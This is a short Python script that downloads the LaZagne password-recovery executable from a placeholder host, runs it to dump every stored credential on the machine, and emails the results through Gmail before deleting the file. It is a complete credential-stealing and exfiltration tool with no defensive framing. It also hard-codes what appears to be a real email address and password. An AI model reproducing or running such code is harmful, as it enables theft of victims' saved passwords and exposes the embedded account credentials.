#!/usr/bin/env python
import subprocess, smtplib, re, requests, os, tempfile

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def download(url):
    res = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "w") as f:
        f.write(res.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://<ip>/evil-files/laZagne.exe") # before upload laZagne exe file to server
command = "laZagne.exe all"
result = subprocess.check_output(command, shell=True)
send_mail("daichi.tominaga@gmail.com", "daidai1993", result)
os.remove("laZagne.exe")